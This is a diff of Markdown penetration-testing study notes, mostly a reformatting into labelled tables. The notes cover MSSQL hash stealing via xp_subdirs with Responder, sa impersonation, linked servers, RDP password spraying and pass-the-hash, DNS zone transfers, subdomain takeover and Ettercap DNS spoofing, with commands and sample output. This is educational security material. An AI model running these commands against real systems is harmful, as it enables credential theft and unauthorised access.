 EXEC master..xp_subdirs '\\10.10.110.17\share\'
 GO
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # HResult 0x55F6, Level 16, State 1
 # xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
 ```
+
+</td></tr>
+</table>
 
 If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.
 
 **XP_SUBDIRS Hash Stealing with Responder**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 sudo responder -I tun0
 ```
-```bash
-#                                          __               
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
+#                                          __
 #   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
 #   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
 #   |__| |_____|_____|   __|_____|__|__|_____||_____|__|
-#                    |__|              
+#                    |__|
 # <SNIP>
 
 # [+] Listening for events...
@@ -1902,26 +2642,42 @@ sudo responder -I tun0
 # [SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:<NTLM_HASH>:<BLOB>
 ```
 
+</td></tr>
+</table>
+
 **XP_SUBDIRS Hash Stealing with Responder**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 sudo impacket-smbserver share ./ -smb2support
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 # [*] Config file parsed
 # [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
-# [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
-# [*] Config file parsed                                                 
-# [*] Config file parsed                                                 
+# [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+# [*] Config file parsed
+# [*] Config file parsed
 # [*] Config file parsed
 # [*] Incoming connection (10.129.203.7,49728)
 # [*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
-# [*] User WINSRV02\mssqlsvc authenticated successfully                        
+# [*] User WINSRV02\mssqlsvc authenticated successfully
 # [*] demouser::WIN7BOX:5e3ab1c4380b94a1:<NTLM_HASH>:<BLOB>
-# [*] Closing down connection (10.129.203.7,49728)                      
+# [*] Closing down connection (10.129.203.7,49728)
 # [*] Remaining connections []
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -1932,6 +2688,10 @@ SQL Server has a special permission, named **IMPERSONATE**, that allows the exec
 
 **Identify Users that We Can Impersonate**
 
+<table width="100%">
+<tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
+<tr><td width="20%">**`1>`**</td><td>
+
 ```sql
 SELECT distinct b.name
 FROM sys.server_permissions a
@@ -1940,7 +2700,13 @@ ON a.grantor_principal_id = b.principal_id
 WHERE a.permission_name = 'IMPERSONATE'
 GO
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # name
 # -----------------------------------------------
 # sa
@@ -1950,16 +2716,29 @@ GO
 # (3 rows affected)
 ```
 
+</td></tr>
+</table>
+
 **Verifying our Current User and Role**
+
+<table width="100%">
+<tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
+<tr><td width="20%">**`1>`**</td><td>
 
 ```sql
 SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
 GO
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # -----------
-# julio                                                                                                                    
+# julio
 
 # (1 rows affected)
 
@@ -1969,9 +2748,16 @@ GO
 # (1 rows affected)
 ```
 
+</td></tr>
+</table>
+
 As the returned value 0 indicates, we do not have the sysadmin role, but we can impersonate the **sa** user.
 
 **Impersonating the SA User**
+
+<table width="100%">
+<tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
+<tr><td width="20%">**`1>`**</td><td>
 
 ```sql
 EXECUTE AS LOGIN = 'sa'
@@ -1979,7 +2765,13 @@ SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
 GO
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # -----------
 # sa
 
@@ -1991,9 +2783,12 @@ GO
 # (1 rows affected)
 ```
 
+</td></tr>
+</table>
+
 We can now execute any command as a sysadmin as the returned value 1 indicates.
 
->**NOTE:** Note: It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using **USE master**.
+> **NOTE:** Note: It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using **USE master**.
 
 > **Note:** If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.
 
@@ -2008,11 +2803,21 @@ From a security perspective, access to a SQL Server with one or more linked serv
 
 **Identify linked Servers**
 
+<table width="100%">
+<tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
+<tr><td width="20%">**`1>`**</td><td>
+
 ```sql
 SELECT srvname, isremote FROM sysservers
 GO
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # srvname                             isremote
 # ----------------------------------- --------
 # DESKTOP-MFERMN4\SQLEXPRESS          1
@@ -2021,26 +2826,41 @@ GO
 # (2 rows affected)
 ```
 
-The query returns each server’s name and the `isremote` flag. In this context, `1` indicates a remote server entry, while `0` sindicates a linked‑server entry on the local instance. For additional details about server metadata, consult the [sysservers compatibility view](https://learn.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql?view=sql-server-ver17).
+</td></tr>
+</table>
 
+The query returns each server’s name and the `isremote` flag. In this context, `1` indicates a remote server entry, while `0` sindicates a linked‑server entry on the local instance. For additional details about server metadata, consult the [sysservers compatibility view](https://learn.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql?view=sql-server-ver17).
 
 | srvname                    | isremote | Meaning                         |
 | -------------------------- | :------: | ------------------------------- |
-| DESKTOP-MFERMN4\SQLEXPRESS |     1    | Remote server                   |
-| 10.0.0.12\SQLEXPRESS       |     0    | Linked server on local instance |
+| DESKTOP-MFERMN4\SQLEXPRESS |    1     | Remote server                   |
+| 10.0.0.12\SQLEXPRESS       |    0     | Linked server on local instance |
 
 **Identify the user used for the connection and its privileges**
+
+<table width="100%">
+<tr><td colspan="2"> 🗄️ <b>MSSQL</b> </td></tr>
+<tr><td width="20%">**`1>`**</td><td>
 
 ```sql
 EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
 GO
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # ------------------------------ ------------------------------ ------------------------------ -----------
 # DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1
 
 # (1 rows affected)
 ```
+
+</td></tr>
+</table>
 
 > **Note:** If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).
 
@@ -2061,33 +2881,46 @@ As **sysadmin**, we control the SQL Server instance. We can read data from any d
 
 Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft that provides a user with a graphical interface to connect to another computer over a network connection. It is one of the most popular administration tools, allowing centralized control of remote systems with the same functionality as if they were on-site.
 
-* **Default Port: TCP/3389**
+- **Default Port: TCP/3389**
 
 RDP is widely used because it enables:
-* Full graphical control of remote Windows systems
-* Centralized administration of distributed IT infrastructure
-* Managed Service Providers (MSPs) to support many client networks from a single location
+
+- Full graphical control of remote Windows systems
+- Centralized administration of distributed IT infrastructure
+- Managed Service Providers (MSPs) to support many client networks from a single location
 
 Unfortunately, while RDP greatly facilitates remote administration, it also creates a significant gateway for attacks. It is a prime target for attackers because:
-* It provides direct, graphical access to a target system.
-* It is often exposed to the internet for convenience.
-* Compromising an RDP connection can bypass many other security controls.
+
+- It provides direct, graphical access to a target system.
+- It is often exposed to the internet for convenience.
+- Compromising an RDP connection can bypass many other security controls.
 
 **Security Risks**
 
 If an attacker gains access to an RDP port, they may be able to:
-* Launch brute-force or password-spraying attacks to steal user credentials
-* Exploit vulnerabilities in the RDP service itself (e.g., BlueKeep)
-* Move laterally through a network after compromising a single machine
-* Escalate privileges, especially if an administrator account is compromised
+
+- Launch brute-force or password-spraying attacks to steal user credentials
+- Exploit vulnerabilities in the RDP service itself (e.g., BlueKeep)
+- Move laterally through a network after compromising a single machine
+- Escalate privileges, especially if an administrator account is compromised
 
 <details>
 <summary><h2>Nmap scan</h2></summary>
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 sudo nmap -Pn -p3389 <TARGET_IP>
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
 # Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST
 # Nmap scan report for <TARGET_IP>
@@ -2097,11 +2930,14 @@ sudo nmap -Pn -p3389 <TARGET_IP>
 # 3389/tcp open ms-wbt-server
 ```
 
-| Flag            | Purpose                                         |
-|-----------------|-------------------------------------------------|
-| `-Pn`           | Treat host as online (skip ICMP ping discovery) |
-| `-p3389`        | Scan only port 3389 (RDP default)               |
-| `<TARGET_IP>`   | Target IP address                               |
+</td></tr>
+</table>
+
+| Flag          | Purpose                                         |
+| ------------- | ----------------------------------------------- |
+| `-Pn`         | Treat host as online (skip ICMP ping discovery) |
+| `-p3389`      | Scan only port 3389 (RDP default)               |
+| `<TARGET_IP>` | Target IP address                               |
 
 </details>
 
@@ -2116,10 +2952,20 @@ Since RDP relies on user credentials for authentication, a common attack vector 
 
 **Step 1: Create a User List**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 cat usernames.txt
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # root
 # test
 # user
@@ -2128,14 +2974,27 @@ cat usernames.txt
 # administrator
 ```
 
+</td></tr>
+</table>
+
 **Step 2: Execute the Password Spray**
 
 **Option 1: Crowbar**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # 2022-04-07 15:35:50 START
 # 2022-04-07 15:35:50 Crowbar v0.4.1
 # 2022-04-07 15:35:50 Trying 192.168.220.142:3389
@@ -2143,12 +3002,25 @@ crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
 # 2022-04-07 15:35:52 STOP
 ```
 
+</td></tr>
+</table>
+
 **Option 2: Hydra**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 # ...
@@ -2158,11 +3030,21 @@ hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
 # 1 of 1 target successfully completed, 1 valid password found
 ```
 
+</td></tr>
+</table>
+
 **Step 3: RDP Login with valid credentials**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 rdesktop -u administrator -p password123 192.168.2.143
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -2174,9 +3056,17 @@ During a penetration test, we often need GUI access to leverage specific applica
 This attack requires **Restricted Admin Mode**, which is disabled by default on modern Windows systems. It must be enabled on the target host via the registry.
 
 **Registry Key to Modify:**
+
+<table width="100%">
+<tr><td colspan="2"> 📟 <b>CMD</b> </td></tr>
+<tr><td width="20%">**`C:\>`**</td><td>
+
 ```cmd
 HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
 ```
+
+</td></tr>
+</table>
 
 **Value Name:** DisableRestrictedAdmin
 **Type:** REG_DWORD
@@ -2184,16 +3074,29 @@ HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
 
 **Step 1: Add the DisableRestrictedAdmin Registry Key**
 
+<table width="100%">
+<tr><td colspan="2"> 📟 <b>CMD</b> </td></tr>
+<tr><td width="20%">**`C:\>`**</td><td>
+
 ```cmd
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 
+</td></tr>
+</table>
+
 **Step 2: Use xfreerdp with the option /pth**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 xfreerdp /v:<TARGET_IP> /u:<USER> /pth:<HASH>
 ```
 
+</td></tr>
+</table>
 
 </details>
 
@@ -2211,10 +3114,20 @@ As nearly all network applications depend on DNS, attacks against DNS servers ar
 <details>
 <summary><h2>Nmap scan</h2></summary>
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 sudo nmap -p53 -Pn -sV -sC <TARGET_IP>
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 03:47 EDT
 # Nmap scan report for <TARGET_IP>
 # Host is up (0.017s latency).
@@ -2223,12 +3136,15 @@ sudo nmap -p53 -Pn -sV -sC <TARGET_IP>
 # 53/tcp  open   domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
 ```
 
-| Flag            | Purpose                                                                      |
-| --------------- | ---------------------------------------------------------------------------- |
-| `-p53`          | Scan only port 53 (DNS service)                                              |
-| `-Pn`           | Treat host as online (skip ICMP ping discovery)                              |
-| `-sV`           | Probe open ports to determine service/version information                    |
-| `-sC`           | Run Nmap’s default set of scripts against the target (DNS enumeration, etc.) |
+</td></tr>
+</table>
+
+| Flag          | Purpose                                                                      |
+| ------------- | ---------------------------------------------------------------------------- |
+| `-p53`        | Scan only port 53 (DNS service)                                              |
+| `-Pn`         | Treat host as online (skip ICMP ping discovery)                              |
+| `-sV`         | Probe open ports to determine service/version information                    |
+| `-sC`         | Run Nmap’s default set of scripts against the target (DNS enumeration, etc.) |
 | `<TARGET_IP>` | Target IP address                                                            |
 
 </details>
@@ -2237,34 +3153,45 @@ sudo nmap -p53 -Pn -sV -sC <TARGET_IP>
 <summary><h2>DNS Zone Transfers (AXFR)</h2></summary>
 
 **DNS Zone**
-* Portion of the DNS namespace managed by an organization/administrator.
-* The DNS namespace is divided into multiple zones.
-* Each zone contains resource records (hostnames, IPs, MX, TXT, etc.).
+
+- Portion of the DNS namespace managed by an organization/administrator.
+- The DNS namespace is divided into multiple zones.
+- Each zone contains resource records (hostnames, IPs, MX, TXT, etc.).
 
 **Zone Transfers**
 
-* DNS servers synchronize by copying zone data from one server to another.
-* Used for redundancy and consistency.
+- DNS servers synchronize by copying zone data from one server to another.
+- Used for redundancy and consistency.
 
 **Why is it a Vulnerability?**
 
-* By default, zone transfers don’t require authentication.
-* If not restricted, **anyone** can request the entire zone data.
-* Attackers gain:
-    * Subdomains
-    * Internal hostnames
-    * Mail servers
-    * Network structure clues
-    * Expanded attack surface
+- By default, zone transfers don’t require authentication.
+- If not restricted, **anyone** can request the entire zone data.
+- Attackers gain:
+  - Subdomains
+  - Internal hostnames
+  - Mail servers
+  - Network structure clues
+  - Expanded attack surface
 
 **DIG - AXFR Zone Transfer**
 
 For exploitation, we can use the dig utility with DNS query type AXFR option to dump the entire DNS namespaces from a vulnerable DNS server:
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # ; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr inlanefrieght.htb @10.129.110.213
 # ;; global options: +cmd
 # inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
@@ -2281,14 +3208,27 @@ dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
 # ;; XFR size: 8 records (messages 1, bytes 289)
 ```
 
+</td></tr>
+</table>
+
 **Fierce - AXFR Zone Transfer**
 
 Tools like [Fierce](https://github.com/mschwager/fierce) can also be used to enumerate all DNS servers of the root domain and scan for a DNS zone transfer
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 fierce --domain zonetransfer.me
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # NS: nsztm2.digi.ninja. nsztm1.digi.ninja.
 # SOA: nsztm1.digi.ninja. (81.4.108.41)
 # Zone: success
@@ -2342,6 +3282,9 @@ fierce --domain zonetransfer.me
 # ...
 ```
 
+</td></tr>
+</table>
+
 </details>
 
 <details>
@@ -2349,48 +3292,58 @@ fierce --domain zonetransfer.me
 
 **Domain Takeover**
 
-* **Definition:** Registering an expired domain to gain control over assets pointing to it.
-* **Attack surface:**
-    * Old domains no longer maintained.
-    * Abandoned services or domains linked in DNS records.
-* **Impact:**
-    * Host malicious content under a trusted brand.
-    * Launch phishing attacks using the claimed domain.
-    * Hijack email flows (SPF/DKIM/DMARC misconfigurations).
+- **Definition:** Registering an expired domain to gain control over assets pointing to it.
+- **Attack surface:**
+  - Old domains no longer maintained.
+  - Abandoned services or domains linked in DNS records.
+- **Impact:**
+  - Host malicious content under a trusted brand.
+  - Launch phishing attacks using the claimed domain.
+  - Hijack email flows (SPF/DKIM/DMARC misconfigurations).
 
 **Subdomain Takeover**
 
-* **Definition:** Hijacking an unclaimed subdomain that points to a third-party service.
+- **Definition:** Hijacking an unclaimed subdomain that points to a third-party service.
 
-* **How it works:**
-    1. Organization creates a CNAME record → points sub.example.com to a third-party service (e.g., GitHub Pages, AWS S3, Azure).
-    2. Service is later unprovisioned (deleted/not claimed).
-    3. DNS record still exists → attacker claims the resource.
-* **Result:** Attacker hosts malicious content under a trusted subdomain.
+- **How it works:**
+  1. Organization creates a CNAME record → points sub.example.com to a third-party service (e.g., GitHub Pages, AWS S3, Azure).
+  2. Service is later unprovisioned (deleted/not claimed).
+  3. DNS record still exists → attacker claims the resource.
+- **Result:** Attacker hosts malicious content under a trusted subdomain.
 
 **Subdomain Enumeration**
 
-Before performing a subdomain takeover, we should enumerate subdomains for a target domain using tools like [Subfinder](https://github.com/projectdiscovery/subfinder) or  [Sublist3r](https://github.com/aboul3la/Sublist3r).
+Before performing a subdomain takeover, we should enumerate subdomains for a target domain using tools like [Subfinder](https://github.com/projectdiscovery/subfinder) or [Sublist3r](https://github.com/aboul3la/Sublist3r).
 
 <details>
 <summary><h3>Enumeration</h3></summary>
 
 **Option 1: Subfinder enumeration**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
-./subfinder -d inlanefreight.com -v  
+./subfinder -d inlanefreight.com -v
 ```
-```bash
-#         _     __ _         _                                           
-# ____  _| |__ / _(_)_ _  __| |___ _ _          
-# (_-< || | '_ \  _| | ' \/ _  / -_) '_|                 
-# /__/\_,_|_.__/_| |_|_||_\__,_\___|_| v2.4.5                                                                                                                                                                                                                                                 
-#                 projectdiscovery.io                    
-                                                                       
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
+#         _     __ _         _
+# ____  _| |__ / _(_)_ _  __| |___ _ _
+# (_-< || | '_ \  _| | ' \/ _  / -_) '_|
+# /__/\_,_|_.__/_| |_|_||_\__,_\___|_| v2.4.5
+#                 projectdiscovery.io
+
 # [WRN] Use with caution. You are responsible for your actions
 # [WRN] Developers assume no liability and are not responsible for any misuse or damage.
-# [WRN] By using subfinder, you also agree to the terms of the APIs used. 
-                                   
+# [WRN] By using subfinder, you also agree to the terms of the APIs used.
+
 # [INF] Enumerating subdomains for inlanefreight.com
 # [alienvault] www.inlanefreight.com
 # [dnsdumpster] ns1.inlanefreight.com
@@ -2404,7 +3357,14 @@ Before performing a subdomain takeover, we should enumerate subdomains for a tar
 # [INF] Found 4 subdomains for inlanefreight.com in 20 seconds 11 milliseconds
 ```
 
+</td></tr>
+</table>
+
 **Option : Subbrute enumeration**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
@@ -2412,15 +3372,24 @@ cd subbrute
 echo "ns1.inlanefreight.com" > ./resolvers.txt
 ./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt
 ```
-```bash
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # Warning: Fewer than 16 resolvers per process, consider adding more nameservers to resolvers.txt.
 # inlanefreight.com
 # ns2.inlanefreight.com
 # www.inlanefreight.com
 # ms1.inlanefreight.com
 # support.inlanefreight.com
-# ...  
+# ...
 ```
+
+</td></tr>
+</table>
 
 Sometimes, internal physical configurations are poorly secured, allowing us to exploit them to introduce tools directly from a USB device.
 
@@ -2430,14 +3399,27 @@ While there are many ways to transfer files in such environments, it is valuable
 
 The tool has found four subdomains associated with `inlanefreight.com`. Using the `nslookup` or `host` command, we can enumerate the **CNAME** records for those subdomains.
 
-```bash 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 host support.inlanefreight.com
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com
 ```
 
-The *support* subdomain has an alias record pointing to an AWS S3 bucket. However, the URL https://support.inlanefreight.com shows a NoSuchBucket error indicating that the subdomain is potentially vulnerable to a subdomain takeover. Now, we can take over the subdomain by creating an AWS S3 bucket with the same subdomain name.
+</td></tr>
+</table>
+
+The _support_ subdomain has an alias record pointing to an AWS S3 bucket. However, the URL https://support.inlanefreight.com shows a NoSuchBucket error indicating that the subdomain is potentially vulnerable to a subdomain takeover. Now, we can take over the subdomain by creating an AWS S3 bucket with the same subdomain name.
 
 The [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz) repository is also an excellent reference for a subdomain takeover vulnerability. It shows whether the target services are vulnerable to a subdomain takeover and provides guidelines on assessing the vulnerability.
 
@@ -2453,34 +3435,34 @@ DNS spoofing (also known as DNS Cache Poisoning) is an attack where legitimate D
 **Example Attack Paths**
 
 1. Man-in-the-Middle (MITM) Attack
-    * The attacker intercepts communication between a user and a DNS server.
-    * The user is then routed to a fraudulent destination instead of the legitimate one.
+   - The attacker intercepts communication between a user and a DNS server.
+   - The user is then routed to a fraudulent destination instead of the legitimate one.
 2. Exploiting DNS Server Vulnerability
-    * The attacker identifies and exploits a flaw in a DNS server.
-    * Gaining control, they modify DNS records to redirect traffic.
+   - The attacker identifies and exploits a flaw in a DNS server.
+   - Gaining control, they modify DNS records to redirect traffic.
 
 **Attack Flow**
 
-```mermaid 
+```mermaid
 flowchart TD
     %% Nodes
     U["<b>👤 User</b>"]
     D["<b>Legitimate DNS Server</b>"]
     A["<b>🔴 Attacker</b>"]
     F["<b>⚠️ Fraudulent Website</b>"]
-    
+
     %% Connections
     U -->|"<b>1.</b> DNS request"| D
     A -->|"<b>2.</b> Poison cache<br/>with fake records"| D
     D -->|"<b>3.</b> Fake IP<br/>fraudulent site"| U
     U -->|"<b>4.</b> Connects to"| F
-    
+
     %% Styling
     style U fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
     style D fill:#4a5a8b,stroke:#6c8ebf,stroke-width:3px,color:#fff
     style A fill:#8b3a3a,stroke:#ff6b6b,stroke-width:3px,color:#fff
     style F fill:#8b6a3a,stroke:#ff9500,stroke-width:3px,color:#fff
-    
+
     %% Link styling
     linkStyle 0 stroke:#6c8ebf,stroke-width:3px
     linkStyle 1 stroke:#ff6b6b,stroke-width:4px,stroke-dasharray:5
@@ -2494,27 +3476,40 @@ flowchart TD
 From a local network perspective, an attacker can also perform DNS Cache Poisoning using MITM tools like Ettercap or Bettercap.
 
 1. **Edit the Ettercap DNS File**
-    * Add an entry mapping the target domain to the attacker’s IP:
+   - Add an entry mapping the target domain to the attacker’s IP:
 
-```bash 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
+```bash
 cat /etc/ettercap/etter.dns
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # <DOMAIN>   A   <ATTACKER_IP>
 ```
 
+</td></tr>
+</table>
+
 2. **Launch Ettercap and Scan the Network**
-    * Start Ettercap.
-    * Navigate to: *Hosts > Scan for Hosts*
-    * Identify the target machine and the gateway.
+   - Start Ettercap.
+   - Navigate to: _Hosts > Scan for Hosts_
+   - Identify the target machine and the gateway.
 
 3. **Set Targets**
-    * Assign Target1 → `<TARGET_IP>`
-    * Assign Target1 → `<ATTACKER_IP>`
+   - Assign Target1 → `<TARGET_IP>`
+   - Assign Target1 → `<ATTACKER_IP>`
 
-3. **Enable DNS Spoofing Plugin**
-    * Navigate to: *Plugins > Manage Plugins*
-    * Activate *dns_spoof*
+4. **Enable DNS Spoofing Plugin**
+   - Navigate to: _Plugins > Manage Plugins_
+   - Activate _dns_spoof_
 
 This will send the victim fake DNS responses, resolving `<DOMAIN>` → `<ATTACKER_IP>`
 
@@ -2524,10 +3519,21 @@ When the victim visits `<DOMAIN>` in a browser →
 They are redirected to the fake page hosted at `<ATTACKER_IP>`.
 
 Even a ping test resolves to the attacker’s IP:
-```cmd 
-C:\>ping <DOMAIN>
+
+<table width="100%">
+<tr><td colspan="2"> 📟 <b>CMD</b> </td></tr>
+<tr><td width="20%">**`C:\>`**</td><td>
+
+```cmd
+ping <DOMAIN>
 ```
-```bash 
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 # Ping <DOMAIN> [<ATTACKER_IP>] with 32 bytes of data:
 # Reply from <ATTACKER_IP>: bytes=32 time<1ms TTL=64
 # Reply from <ATTACKER_IP>: bytes=32 time<1ms TTL=64
@@ -2539,6 +3545,9 @@ C:\>ping <DOMAIN>
 # Approximate round trip times in milli-seconds:
 #     Minimum = 0ms, Maximum = 0ms, Average = 0ms
 ```
+
+</td></tr>
+</table>
 
 **Attack Flow**
 
@@ -2564,32 +3573,33 @@ flowchart TD
 
 A mail server (or email server) is responsible for handling and delivering email over a network, typically the Internet.
 
-* Functions:
-    * Receives emails from client devices.
-    * Sends emails to other mail servers.
-    * Delivers emails back to client devices.
+- Functions:
+  - Receives emails from client devices.
+  - Sends emails to other mail servers.
+  - Delivers emails back to client devices.
 
 > **NOTE:** In this context, "clients" are devices where users read emails (e.g., computers, smartphones).
 
 **Sending Emails (SMTP)**
 
 When you press Send in your email application:
+
 1. The client establishes a connection to an SMTP server.
 2. SMTP = Simple Mail Transfer Protocol.
-    * Handles delivery of emails from clients → servers.
-    * Handles forwarding of emails between servers.
+   - Handles delivery of emails from clients → servers.
+   - Handles forwarding of emails between servers.
 
 **Receiving Emails (POP3 vs. IMAP4)**
 
-* POP3 (Post Office Protocol v3):
-    * Downloads emails from the server to the client.
-    * Default behavior: removes the message from the server after download.
-    * Issue: difficult to access emails from multiple devices.
-    * Solution: configure the POP3 client to keep a copy on the server.
-* IMAP4 (Internet Message Access Protocol v4):
-    * Syncs emails between server and client.
-    * Default behavior: leaves emails on the server.
-    * Benefit: access the same mailbox from multiple devices seamlessly.
+- POP3 (Post Office Protocol v3):
+  - Downloads emails from the server to the client.
+  - Default behavior: removes the message from the server after download.
+  - Issue: difficult to access emails from multiple devices.
+  - Solution: configure the POP3 client to keep a copy on the server.
+- IMAP4 (Internet Message Access Protocol v4):
+  - Syncs emails between server and client.
+  - Default behavior: leaves emails on the server.
+  - Benefit: access the same mailbox from multiple devices seamlessly.
 
 **Protocols and Flow**
 
@@ -2600,20 +3610,20 @@ flowchart TD
     GW["<b>Default Gateway</b><br/>192.168.152.2"]
     A["<b>🔴 Attacker</b><br/>192.168.225.110"]
     F["<b>⚠️ Fake Website</b><br/>Hosted on Attacker's IP"]
-    
+
     %% Connections
     V -->|"<b>1.</b> DNS Request:<br/>inlanefreight.com"| GW
     A -->|"<b>2.</b> dns_spoof Plugin<br/>Injects Fake Response"| GW
